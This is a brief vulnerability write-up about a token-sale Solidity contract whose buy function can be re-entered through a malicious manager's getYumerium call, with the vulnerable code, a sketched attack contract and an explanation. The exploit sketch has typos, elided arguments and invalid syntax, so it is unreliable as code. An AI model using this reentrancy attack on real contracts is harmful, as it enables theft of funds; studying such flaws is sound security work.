## Vulnerable Code

```javascript
contract Sale {
    ...

    ...
    function buy(bytes8 referralCode) internal {
            require(msg.value>=minEthValue);
            require(now < saleEnd4); // main sale postponed

            // distribution for referral
            uint256 remainEth = msg.value;
            if (referral[referralCode] != msg.sender && renownedPlayers[referral[referralCode]].isRenowned)
            {
                uint256 referEth = msg.value.mul(10).div(100);
                referral[referralCode].transfer(referEth);  //Vulnerable position_1
                remainEth = remainEth.sub(referEth);
            }

            if (!renownedPlayers[msg.sender].isRenowned)
            {
                generateRenown();
            }
            
            uint256 amount = manager.getYumerium(msg.value, msg.sender);    //Vulnerable position_2
            uint256 total = totalSaled.add(amount);
            owner.transfer(remainEth);
            
            require(total<=maxSale);
            
            totalSaled = total;
            
            emit Contribution(msg.sender, amount);
    }
}
```



## Exploit Code

```javascript
Contract Attack is Sale{
    uint count;
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton getYumerium() payable{
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256(“buy(bytes8)”)), ...);
        }
    }
    function() payable{

    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position_2: IF manager object obtained from a malicious address, the method of getYumerium can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim. ps:"...." represent an appropriate parameter

